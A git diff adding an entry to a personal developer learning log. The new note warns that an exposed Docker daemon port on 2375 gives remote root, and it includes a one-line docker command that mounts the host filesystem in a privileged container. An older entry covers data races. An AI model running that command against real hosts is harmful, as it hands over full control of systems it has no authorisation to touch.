@@ -1,6 +1,8 @@
 # About
 This is a place I've committed to record interesting things I learn about development, or want to revisit.
 
+# Jan 7, 2019
+* If the docker daemon port is exposed on a host, remote attackers can [easily gain root access](https://stackoverflow.com/questions/43399998/how-does-docker-use-ports-2375-and-4243). `docker -H $your_ip:2375 run -it --rm --privileged -v /:/rootfs --net host --pid host busybox`
 # Jan 3, 2019
 * A data race can occur when multiple pointers, some of which have write access, try to access the same data simultaneously without a locking mechanism in place.
 
